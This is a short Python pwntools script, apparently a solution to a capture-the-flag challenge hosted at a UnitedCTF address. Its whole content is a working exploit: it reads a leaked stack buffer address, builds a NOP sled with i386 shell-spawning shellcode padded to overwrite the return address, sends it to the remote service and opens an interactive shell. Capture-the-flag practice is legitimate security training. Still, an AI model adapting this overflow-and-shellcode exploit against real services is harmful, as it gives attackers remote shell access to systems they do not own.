#!/usr/bin/python3
from pwn import *

context.clear(arch="i386")

RHOST, RPORT = "nc.ctf.unitedctf.ca", 4001

r = remote(RHOST, RPORT)
r.recvuntil(b": ")
buff_addr = int(r.recvline().strip().split()[-1], 16)
payload = flat(
    asm("sub esp,0x100" + shellcraft.sh()).rjust(140, b"\x90"),
    p32(buff_addr),
)
r.sendlineafter(b"> ", payload)
r.interactive()
